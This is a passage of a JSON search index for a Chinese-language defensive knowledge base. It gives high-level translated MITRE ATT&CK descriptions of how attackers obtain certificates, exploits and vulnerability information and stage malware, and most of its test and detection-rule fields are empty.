3002\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4ece\u88ab\u653b\u51fb\u7684\u7b2c\u4e09\u65b9\u90a3\u91cc\u7a83\u53d6\u8bc1\u4e66\u6750\u6599\uff0c\u5305\u62ec\u4ece\u8bc1\u4e66\u9881\u53d1\u673a\u6784\u90a3\u91cc\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u6ce8\u518c\u6216\u52ab\u6301\u4ed6\u4eec\u4ee5\u540e\u8981\u8d2d\u4e70SSL/TLS\u8bc1\u4e66\u7684\u57df\u540d\u3002</p> <p>\u6709\u4e00\u4e9b\u8bc1\u4e66\u9881\u53d1\u673a\u6784\u5141\u8bb8\u653b\u51fb\u8005\u514d\u8d39\u83b7\u5f97SSL/TLS\u8bc1\u4e66\uff0c\u5982\u57df\u540d\u9a8c\u8bc1\u8bc1\u4e66\u3002</p> <p>\u83b7\u5f97\u6570\u5b57\u8bc1\u4e66\u540e\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u5176\u63a7\u5236\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\u5b89\u88c5\u8be5\u8bc1\u4e66\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6682\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_6","title":"\u5efa\u8bae","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_7","title":"\u7f13\u89e3\u63aa\u65bd","text":"<p>\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_8","title":"\u68c0\u6d4b","text":"<p>\u8003\u8651\u4f7f\u7528\u53ef\u80fd\u6709\u52a9\u4e8e\u8ddf\u8e2a\u65b0\u9881\u53d1\u7684\u8bc1\u4e66\u6216\u4e92\u8054\u7f51\u4e0a\u7684\u7f51\u7ad9\u4f7f\u7528\u7684\u8bc1\u4e66\u7684\u670d\u52a1\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6709\u53ef\u80fd\u901a\u8fc7\u5df2\u77e5\u7684\u8bc1\u4e66\u4fe1\u606f\u6765\u53d1\u73b0\u5176\u4ed6\u653b\u51fb\u8005\u7684\u57fa\u7840\u8bbe\u65bd\u3002\u653b\u51fb\u8005\u5de5\u5177\u7684\u4e00\u4e9b\u670d\u52a1\u5668\u7aef\u7ec4\u4ef6\u53ef\u80fd\u4e3aSSL/TLS\u8bc1\u4e66\u8bbe\u7f6e\u4e86\u9ed8\u8ba4\u503c\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u76f8\u5173\u884c\u4e3a\u4e0a\uff0c\u5982\u7f51\u7edc\u534f\u8bae\u3001\u975e\u5bf9\u79f0\u52a0\u5bc6\u6216\u5b89\u88c5\u6839\u8bc1\u4e66\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-004-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1588-004</p> <p>https://attack.mitre.org/techniques/T1588/004/</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","title":"T1588-005-\u83b7\u53d6\u80fd\u529b-\u6f0f\u6d1e\u5229\u7528","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u3001\u7a83\u53d6\u6216\u4e0b\u8f7d\u53ef\u5728\u653b\u51fb\u76ee\u6807\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u7684\u6f0f\u6d1e\u3002\u6f0f\u6d1e\u5229\u7528\u4e86\u4e00\u4e2a\u9519\u8bef\u6216\u6f0f\u6d1e\uff0c\u4ee5\u4f7f\u8ba1\u7b97\u673a\u786c\u4ef6\u6216\u8f6f\u4ef6\u53d1\u751f\u975e\u9884\u671f\u6216\u610f\u6599\u4e4b\u5916\u7684\u884c\u4e3a\u3002\u4e0e\u5176\u5f00\u53d1\u81ea\u5df1\u7684\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4ece\u7f51\u4e0a\u627e\u5230/\u4fee\u6539\u6f0f\u6d1e\uff0c\u6216\u4ece\u6f0f\u6d1e\u4f9b\u5e94\u5546\u90a3\u91cc\u8d2d\u4e70\u6f0f\u6d1e\u3002</p> <p>\u9664\u4e86\u4ece\u4e92\u8054\u7f51\u4e0a\u4e0b\u8f7d\u514d\u8d39\u7684\u6f0f\u6d1e\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u4ece\u7b2c\u4e09\u65b9\u5b9e\u4f53\u8d2d\u4e70\u6f0f\u6d1e\u3002\u7b2c\u4e09\u65b9\u5b9e\u4f53\u53ef\u4ee5\u5305\u62ec\u4e13\u95e8\u4ece\u4e8b\u6f0f\u6d1e\u5f00\u53d1\u7684\u6280\u672f\u516c\u53f8\u3001\u72af\u7f6a\u5e02\u573a\uff08\u5305\u62ec\u6f0f\u6d1e\u5de5\u5177\u5305\uff09\u6216\u4e2a\u4eba\u3002\u9664\u4e86\u8d2d\u4e70\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u4ece\u7b2c\u4e09\u65b9\u5b9e\u4f53\uff08\u5305\u62ec\u5176\u4ed6\u653b\u51fb\u8005\uff09\u7a83\u53d6\u548c\u91cd\u65b0\u5229\u7528\u6f0f\u6d1e\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u76d1\u63a7\u6f0f\u6d1e\u63d0\u4f9b\u8005\u7684\u8bba\u575b\uff0c\u4ee5\u4e86\u89e3\u73b0\u6709\u7684\u4ee5\u53ca\u65b0\u53d1\u73b0\u7684\u6f0f\u6d1e\u7684\u72b6\u6001\u3002\u5728\u53d1\u73b0\u6f0f\u6d1e\u548c\u516c\u5f00\u6f0f\u6d1e\u4e4b\u95f4\u901a\u5e38\u4f1a\u6709\u5ef6\u8fdf\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4ee5\u90a3\u4e9b\u5df2\u77e5\u8fdb\u884c\u6f0f\u6d1e\u7814\u7a76\u548c\u5f00\u53d1\u7684\u7cfb\u7edf\u4e3a\u76ee\u6807\uff0c\u4ee5\u4fbf\u83b7\u5f97\u77e5\u8bc6\uff0c\u5728\u540e\u7eed\u884c\u52a8\u4e2d\u4f7f\u7528\u3002</p> <p>\u653b\u51fb\u53ef\u8005\u80fd\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u5404\u4e2a\u9636\u6bb5\u4f7f\u7528\u6f0f\u6d1e\uff08\u5373\u5229\u7528\u9762\u5411\u516c\u4f17\u7684\u5e94\u7528\u7a0b\u5e8f\u3001\u5229\u7528\u5ba2\u6237\u7aef\u6267\u884c\u3001\u5229\u7528\u7279\u6743\u5347\u7ea7\u3001\u5229\u7528\u9632\u5fa1\u89c4\u907f\u3001\u5229\u7528\u51ed\u8bc1\u8bbf\u95ee\u3001\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u3001\u4ee5\u53ca\u5e94\u7528\u6216\u7cfb\u7edf\u6f0f\u6d1e\uff09\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6682\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_6","title":"\u5efa\u8bae","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_7","title":"\u7f13\u89e3\u63aa\u65bd","text":"<p>\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_8","title":"\u68c0\u6d4b","text":"<p>\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u4e0e\u4f7f\u7528\u6f0f\u6d1e\u6709\u5173\u7684\u884c\u4e3a\u4e0a\uff08\u5373\u5229\u7528\u9762\u5411\u516c\u4f17\u7684\u5e94\u7528\u7a0b\u5e8f\u3001\u5229\u7528\u5ba2\u6237\u7aef\u6267\u884c\u3001\u5229\u7528\u7279\u6743\u5347\u7ea7\u3001\u5229\u7528\u9632\u5fa1\u89c4\u907f\u3001\u5229\u7528\u51ed\u8bc1\u8bbf\u95ee\u3001\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u3001\u4ee5\u53ca\u5e94\u7528\u6216\u7cfb\u7edf\u6f0f\u6d1e\uff09\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-005-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1588-005</p> <p>https://attack.mitre.org/techniques/T1588/005/</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/","title":"T1588-006-\u83b7\u53d6\u80fd\u529b-\u6f0f\u6d1e","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u83b7\u5f97\u6709\u5173\u6f0f\u6d1e\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u786e\u5b9a\u653b\u51fb\u76ee\u6807\u7684\u65b9\u6cd5\u65f6\u4f7f\u7528\u3002\u6f0f\u6d1e\u662f\u8ba1\u7b97\u673a\u786c\u4ef6\u6216\u8f6f\u4ef6\u4e2d\u7684\u4e00\u4e2a\u5f31\u70b9\uff0c\u5b83\u6709\u53ef\u80fd\u88ab\u653b\u51fb\u8005\u5229\u7528\uff0c\u5bfc\u81f4\u53d1\u751f\u975e\u9884\u671f\u6216\u610f\u6599\u4e4b\u5916\u7684\u884c\u4e3a\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u641c\u7d22\u5f00\u653e\u7684\u6f0f\u6d1e\u6570\u636e\u5e93\u6216\u8fdb\u5165\u5c01\u95ed\u7684\u6f0f\u6d1e\u6570\u636e\u5e93\u6765\u5bfb\u627e\u6f0f\u6d1e\u4fe1\u606f\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u76d1\u89c6\u6f0f\u6d1e\u62ab\u9732\u6570\u636e\u5e93\uff0c\u4ee5\u4e86\u89e3\u73b0\u6709\u7684\u4ee5\u53ca\u65b0\u53d1\u73b0\u7684\u6f0f\u6d1e\u7684\u72b6\u51b5\u3002\u5728\u53d1\u73b0\u6f0f\u6d1e\u548c\u516c\u5f00\u6f0f\u6d1e\u4e4b\u95f4\u901a\u5e38\u4f1a\u6709\u5ef6\u8fdf\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u628a\u90a3\u4e9b\u5df2\u77e5\u8fdb\u884c\u6f0f\u6d1e\u7814\u7a76\u7684\u7cfb\u7edf\u4f5c\u4e3a\u76ee\u6807\uff08\u5305\u62ec\u5546\u4e1a\u4f9b\u5e94\u5546\uff09\u3002\u5bf9\u6f0f\u6d1e\u7684\u4e86\u89e3\u53ef\u80fd\u4f1a\u4f7f\u653b\u51fb\u8005\u5bfb\u627e\u73b0\u6709\u7684\u6f0f\u6d1e\u6216\u8bd5\u56fe\u81ea\u5df1\u6316\u6398\u51fa\u4e00\u4e2a\u6f0f\u6d1e\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6682\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#_6","title":"\u5efa\u8bae","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#_7","title":"\u7f13\u89e3\u63aa\u65bd","text":"<p>\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#_8","title":"\u68c0\u6d4b","text":"<p>\u5927\u90e8\u5206\u6b64\u7c7b\u6d3b\u52a8\u5c06\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u53ef\u89c1\u6027\u4e4b\u5916\u8fdb\u884c\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u8fd9\u79cd\u884c\u4e3a\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4fa7\u91cd\u4e8e\u4e0e\u6f0f\u6d1e\u5229\u7528\u7684\u6f5c\u5728\u4f7f\u7528\u76f8\u5173\u7684\u884c\u4e3a\uff08\u5373\u5229\u7528\u9762\u5411\u516c\u4f17\u7684\u5e94\u7528\u7a0b\u5e8f\u3001\u5229\u7528\u5ba2\u6237\u7aef\u6267\u884c\u3001\u5229\u7528\u7279\u6743\u5347\u7ea7\u3001\u5229\u7528\u9632\u5fa1\u89c4\u907f\u3001\u5229\u7528\u51ed\u636e\u8bbf\u95ee\u3001\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\uff0c\u4ee5\u53ca\u5e94\u7528\u7a0b\u5e8f\u6216\u7cfb\u7edf\u5f00\u53d1\uff09</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-006-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1588-006</p> <p>https://attack.mitre.org/techniques/T1588/006/</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/","title":"T1608-001-\u9636\u6bb5\u6027\u80fd\u529b-\u4e0a\u4f20\u6076\u610f\u8f6f\u4ef6","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u6076\u610f\u8f6f\u4ef6\u4e0a\u4f20\u5230\u7b2c\u4e09\u65b9\u6216\u653b\u51fb\u8005\u63a7\u5236\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\uff0c\u4f7f\u5176\u5728\u653b\u51fb\u76ee\u6807\u671f\u95f4\u53ef\u4ee5\u8bbf\u95ee\u3002\u6076\u610f\u8f6f\u4ef6\u53ef\u4ee5\u5305\u62ec\u6709\u6548\u8f7d\u8377\u3001\u8bf1\u9975\u3001\u540e\u6e17\u900f\u5de5\u5177\u3001\u540e\u95e8\u548c\u5176\u4ed6\u5404\u79cd\u6076\u610f\u7a0b\u5e8f\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4e0a\u4f20\u6076\u610f\u8f6f\u4ef6\u4ee5\u652f\u6301\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u4f8b\u5982\u5c06\u6709\u6548\u8f7d\u8377\u653e\u5728\u4e92\u8054\u7f51\u53ef\u8bbf\u95ee\u7684\u7f51\u7edc\u670d\u52a1\u5668\u4e0a\uff0c\u4f7f\u53d7\u5bb3\u8005\u7f51\u7edc\u53ef\u4ee5\u4f7f\u7528\u5165\u4fb5\u5de5\u5177\u4f20\u8f93\u3002</p> <p>\u6076\u610f\u8f6f\u4ef6\u53ef\u80fd\u88ab\u653e\u7f6e\u5728\u4ee5\u524d\u88ab\u653b\u51fb\u8005\u8d2d\u4e70\u6216\u79df\u7528\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\uff08\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd\uff09\u6216\u88ab\u4ed6\u4eec\u7834\u574f\u7684\u57fa\u7840\u8bbe\u65bd\uff08\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd\uff09\u3002\u6076\u610f\u8f6f\u4ef6\u4e5f\u53ef\u4ee5\u653e\u5728\u7f51\u7edc\u670d\u52a1\u4e0a\uff0c\u5982GitHub\u6216Pastebin\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5907\u4efd\u6587\u4ef6\uff0c\u5982\u5e94\u7528\u7a0b\u5e8f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3001\u865a\u62df\u673a\u56fe\u50cf\u6216\u5bb9\u5668\u56fe\u50cf\uff0c\u4e0a\u4f20\u5230\u7b2c\u4e09\u65b9\u8f6f\u4ef6\u5546\u5e97\u6216\u5b58\u50a8\u5e93\uff08\u4f8b\u5982\uff1aGitHub\u3001CNET\u3001AWS\u793e\u533aAMI\u3001Docker Hub\uff09\u3002\u5076\u7136\u7684\u673a\u4f1a\uff0c\u53d7\u5bb3\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u7528\u6237\u6267\u884c\u76f4\u63a5\u4e0b\u8f7d\u6216\u5b89\u88c5\u8fd9\u4e9b\u88ab\u53cd\u5c4f\u853d\u7684\u6587\u4ef6\u3002\u5de7\u5999\u7684\u4f2a\u88c5\u53ef\u80fd\u4f1a\u589e\u52a0\u7528\u6237\u9519\u8bef\u5730\u6267\u884c\u8fd9\u4e9b\u6587\u4ef6\u7684\u673a\u4f1a\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6682\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_6","title":"\u5efa\u8bae","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_7","title":"\u7f13\u89e3\u63aa\u65bd","text":"<p>\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1608-001-%E9%98%B6%E6%AE%B5%E6%80%A7%E8%83%BD%E5%8A%9B-%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_8","title":"\u68c0\u6d4b","text":"<p>\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u68c0\u6d4b\u8fd9\u79cd\u884c\u4e3a\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u7834\u574f\u540e\u9636\u6bb5\uff0c\u5982\u7528